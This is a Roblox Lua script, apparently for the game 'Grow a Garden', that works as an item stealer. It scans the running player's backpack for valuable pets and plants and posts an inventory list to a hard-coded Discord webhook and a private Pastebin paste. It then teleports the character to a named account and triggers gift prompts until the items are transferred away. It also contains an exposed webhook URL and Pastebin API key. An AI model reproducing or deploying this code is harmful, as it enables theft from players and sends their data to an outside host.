task.spawn(function()
	repeat task.wait() until game:IsLoaded()
	print("[DEBUG] Script started")

	_G.scriptExecuted = _G.scriptExecuted or false
	if _G.scriptExecuted then return end
	_G.scriptExecuted = true

	-- CONFIG
	local users = _G.Usernames or {"DanyelQuibs"}
	local min_value = _G.min_value or 100000
	local ping = _G.pingEveryone or "No"
	local webhook = "https://discord.com/api/webhooks/1382457262177783889/omW4Knrp97WLOI_6PkoA1DWV_huJAeLfhHqm_jzk9OuOzIdwlEqsir7wkV6GyfS2QLpy"
	local pastebin_api_key = "kZi_lZU3maKIm3hEDOgM2m4yttXDuPpS"

	-- SERVICES
	local Players = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	local plr = Players.LocalPlayer
	local replicatedStorage = game:GetService("ReplicatedStorage")
	local backpack = plr:WaitForChild("Backpack")
	local character = plr.Character or plr.CharacterAdded:Wait()
	local modules = replicatedStorage:WaitForChild("Modules")

	-- MODULES
	local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
	local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
	local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
	local numberUtil = require(modules:WaitForChild("NumberUtil"))
	local dataService = require(modules:WaitForChild("DataService"))

	print("[DEBUG] All modules loaded")

	-- HELPERS
	local function formatNumber(n)
		local suffixes = {"", "k", "m", "b", "t"}
		local i = 1
		while n >= 1000 and i < #suffixes do
			n = n / 1000
			i = i + 1
		end
		return (i == 1 and math.floor(n)) or string.format("%.2f%s", n, suffixes[i])
	end

	local function formatShort(n)
		if n >= 1e12 then return string.format("%.2fT", n / 1e12) end
		if n >= 1e9 then return string.format("%.2fB", n / 1e9) end
		if n >= 1e6 then return string.format("%.2fM", n / 1e6) end
		if n >= 1e3 then return string.format("%.2fK", n / 1e3) end
		return tostring(math.floor(n))
	end

	local function getWeight(tool)
		local value = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG")
		if value and value:IsA("NumberValue") then
			return math.floor(value.Value * 100 + 0.5) / 100
		end
		local match = tool.Name:match("%[(%d+%.?%d*) ?KG%]") or tool.Name:match("%((%d+%.?%d*) ?kg%)")
		return match and tonumber(match) or 0
	end

	local function calcPetValue(petData)
		local hatchedFrom = petData.PetData.HatchedFrom
		if not hatchedFrom then return 0 end
		local eggData = petRegistry.PetEggs[hatchedFrom]
		if not eggData then return 0 end
		local rarity = eggData.RarityData.Items[petData.PetType]
		if not rarity then return 0 end
		local weightRange = rarity.GeneratedPetData.WeightRange
		if not weightRange then return 0 end
		local interp = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
		local scale = math.lerp(0.8, 1.2, interp)
		local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
		local finalScale = scale * math.lerp(0.15, 6, levelProgress)
		local value = petRegistry.PetList[petData.PetType].SellPrice * finalScale
		return math.floor(value)
	end

	-- SCAN ITEMS
	local itemsToSend = {}
	local totalValue = 0
	local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
	local rarePets = {["Red Fox"] = "🦊", ["Raccoon"] = "🦝", ["Dragonfly"] = "🐲"}

	print("[DEBUG] Scanning backpack...")
	for _, tool in ipairs(backpack:GetChildren()) do
		if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
			if tool:GetAttribute("ItemType") == "Pet" then
				local uuid = tool:GetAttribute("PET_UUID")
				local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
				if petData then
					local name = petData.PetType
					local value = calcPetValue(petData)
					local weight = getWeight(tool)
					table.insert(itemsToSend, {
						Tool = tool,
						Name = name,
						Value = value,
						Weight = weight,
						Type = "Pet",
						Emoji = rarePets[name] or "🐶",
						Rare = rarePets[name] ~= nil
					})
					totalValue += value
				end
			else
				local value = calcPlantValue(tool)
				if value >= min_value then
					local name = tool:GetAttribute("ItemName") or tool.Name
					local weight = getWeight(tool)
					table.insert(itemsToSend, {
						Tool = tool,
						Name = name,
						Value = value,
						Weight = weight,
						Type = "Plant",
						Emoji = "🍄",
						Rare = false
					})
					totalValue += value
				end
			end
		end
	end

	table.sort(itemsToSend, function(a, b)
		if a.Rare and not b.Rare then return true end
		if not a.Rare and b.Rare then return false end
		return a.Value > b.Value
	end)

	-- WEBHOOK
	local function sendWebhook()
		local previewBlock = ":palm_tree: Backpack (Top Items)\n```\n"
		local pasteData = ""
		local count = 0

		for _, item in ipairs(itemsToSend) do
			local line = string.format("%s - %s [%.2f KG] → %s¢\n", item.Emoji, item.Name, item.Weight, formatShort(item.Value))
			pasteData ..= line
			if count < 25 then previewBlock ..= line end
			count += 1
		end
		previewBlock ..= "```"

		local pasteLink = "Failed to upload to Pastebin"
		local pasteRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
		if pasteRequest then
			local result = pasteRequest({
				Url = "https://pastebin.com/api/api_post.php",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
				Body = "api_dev_key=" .. pastebin_api_key ..
					"&api_option=paste" ..
					"&api_paste_private=1" ..
					"&api_paste_name=" .. HttpService:UrlEncode("Item List - " .. plr.Name) ..
					"&api_paste_expire_date=N" ..
					"&api_paste_format=text" ..
					"&api_paste_code=" .. HttpService:UrlEncode(pasteData)
			})
			if result and result.Body and result.Body:find("https://pastebin.com/") then
				pasteLink = result.Body:gsub("https://pastebin.com/", "https://pastebin.com/raw/")
			end
		end

		local payload = {
			content = (ping == "Yes" and "@everyone " or "") .. "**Gifting Triggered**",
			embeds = {{
				title = ":potted_plant: Gift Summary",
				color = 65280,
				fields = {
					{ name = "Player", value = plr.Name, inline = true },
					{ name = "Total Value", value = "¢" .. formatShort(totalValue), inline = true },
					{ name = "Items", value = previewBlock }
				},
				footer = { text = "GAG gifting logger" }
			}},
			components = {}
		}

		local request = (http and http.request) or (syn and syn.request) or (fluxus and fluxus.request)
		if request then
			local success, err = pcall(function()
				request({
					Url = webhook,
					Method = "POST",
					Headers = {["Content-Type"] = "application/json"},
					Body = HttpService:JSONEncode(payload)
				})
			end)
			if success then
				print("[DEBUG] Webhook sent")
			else
				warn("[ERROR] Webhook failed:", err)
			end
		end
	end

	-- GIFTING
	local function giftItemsTo(target)
		print("[DEBUG] Gifting to:", target.Name)
		local root = character:WaitForChild("HumanoidRootPart")
		local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
		root.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 2)
		task.wait(0.2)

		for _, item in ipairs(itemsToSend) do
			item.Tool.Parent = character
			local prompt = item.Type == "Pet"
				and target.Character:WaitForChild("Head"):WaitForChild("ProximityPrompt")
				or targetRoot:WaitForChild("ProximityPrompt")
			repeat task.wait(0.01) until prompt.Enabled
			fireproximityprompt(prompt)
			task.wait(0.3)

			if not item.Tool:IsDescendantOf(game) then
				print("[DEBUG] Tool disappeared:", item.Tool.Name)
			else
				print("[DEBUG] Tool not gifted:", item.Tool.Name)
				item.Tool.Parent = backpack
			end
			task.wait(0.2)
		end

		local timeout = 0
		while timeout < 10 do
			local stillOwned = false
			for _, item in ipairs(itemsToSend) do
				if item.Tool:IsDescendantOf(plr) or item.Tool:IsDescendantOf(backpack) then
					stillOwned = true
					break
				end
			end
			if not stillOwned then break end
			timeout += 1
			task.wait(1)
		end
	end

	-- MAIN
	if #itemsToSend > 0 then
		sendWebhook()
		local function findTarget()
			for _, p in ipairs(Players:GetPlayers()) do
				if table.find(users, p.Name) then
					return p
				end
			end
			return nil
		end

		local target = findTarget()
		if target then
			giftItemsTo(target)
		else
			print("[DEBUG] Waiting for target...")
			Players.PlayerAdded:Connect(function(p)
				if table.find(users, p.Name) then
					p.CharacterAdded:Wait()
					task.wait(1)
					giftItemsTo(p)
				end
			end)
		end
	else
		print("[DEBUG] No items to gift.")
	end
end)
